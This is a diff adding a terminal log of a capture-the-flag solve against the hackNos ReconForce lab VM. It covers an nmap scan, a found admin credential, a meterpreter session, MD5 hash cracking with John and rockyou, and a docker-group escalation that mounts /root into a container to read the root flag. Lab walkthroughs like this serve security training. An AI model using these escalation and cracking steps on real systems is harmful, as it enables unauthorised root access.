@@ -1,0 +1,124 @@
+root@ap:~# nmap -A -p- 192.168.43.112
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-10 22:58 CET
+Nmap scan report for 192.168.43.112
+Host is up (0.00063s latency).
+Not shown: 65532 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.0.8 or later
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.43.254
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 6f:96:94:65:72:80:08:93:23:90:20:bc:76:df:b8:ec (RSA)
+|   256 6f:bb:49:1a:a9:b6:e5:00:84:19:a0:e4:2b:c4:57:c4 (ECDSA)
+|_  256 ce:3d:94:05:f4:a6:82:c4:7f:3f:ba:37:1d:f6:23:b0 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title:  Recon_Web
+MAC Address: 08:00:27:0F:5B:59 (Oracle VirtualBox virtual NIC)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=2/10%OT=21%CT=1%CU=41485%PV=Y%DS=1%DC=D%G=Y%M=080027%T
+OS:M=5E41D21E%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10A%TI=Z%CI=Z%II=I
+OS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O
+OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6
+OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
+OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
+OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
+OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
+OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
+OS:N%T=40%CD=S)
+
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.63 ms 192.168.43.112
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 31.12 seconds
+root@ap:~# 
+
+
+User:
+Admin:Security@hackNos
+
+
+meterpreter > cat user.txt
+###########################################
+
+MD5HASH: bae11ce4f67af91fa58576c1da2aad4b
+
+
+root@ap:~/Scrivania/CTF/ReconForce_01# john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:01 DONE (2020-02-15 11:04) 0g/s 8745Kp/s 8745Kc/s 8745KC/s  fuckyooh21..*7¡Vamos!
+Session complete
+
+
+econ@hacknos:~$ id
+uid=1000(recon) gid=119(docker) groups=119(docker),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lxd)
+recon@hacknos:~$ 
+recon@hacknos:~$ 
+recon@hacknos:~$ docker r
+rename   restart  rm       rmi      run      
+recon@hacknos:~$ docker r
+rename   restart  rm       rmi      run      
+recon@hacknos:~$ docker r
+rename   restart  rm       rmi      run      
+recon@hacknos:~$ docker run ubuntu
+Unable to find image 'ubuntu:latest' locally
+latest: Pulling from library/ubuntu
+5c939e3a4d10: Pull complete 
+c63719cdbe7a: Pull complete 
+19a861ea6baf: Pull complete 
+651c9d2d6c4f: Pull complete 
+Digest: sha256:8d31dad0c58f552e890d68bbfb735588b6b820a46e459672d96e585871acc110
+Status: Downloaded newer image for ubuntu:latest
+recon@hacknos:~$ docker run-it -v /root:/mnt ubuntu
+Docker version 19.03.2, build 6a30dfca03
+recon@hacknos:~$ docker run-it -v /root:/mnt ubuntu
+Docker version 19.03.2, build 6a30dfca03
+recon@hacknos:~$ docker run -it -v /root:/mnt ubuntu
+root@3448197be77b:/# 
+root@3448197be77b:/# cd mnt/
+root@3448197be77b:/mnt# ls
+root.txt  snap
+root@3448197be77b:/mnt# cat root.txt 
+     $$\          $$$$$$$\                                          
+     \$$\         $$  __$$\                                         
+$$$$\ \$$\        $$ |  $$ | $$$$$$\   $$$$$$$\  $$$$$$\  $$$$$$$\  
+\____| \$$\       $$$$$$$  |$$  __$$\ $$  _____|$$  __$$\ $$  __$$\ 
+$$$$\  $$  |      $$  __$$< $$$$$$$$ |$$ /      $$ /  $$ |$$ |  $$ |
+\____|$$  /       $$ |  $$ |$$   ____|$$ |      $$ |  $$ |$$ |  $$ |
+     $$  /        $$ |  $$ |\$$$$$$$\ \$$$$$$$\ \$$$$$$  |$$ |  $$ |
+     \__/         \__|  \__| \_______| \_______| \______/ \__|  \__|
+                                                                    
+                                                                    
+                                                                    
+
+MD5HASH: bae11ce4f67af91fa58576c1da2aad4b
+
+Author: Rahul Gehlaut
+
+WebBlog: www.hackNos.com
+
+Twitter: @rahul_gehlaut
+
+
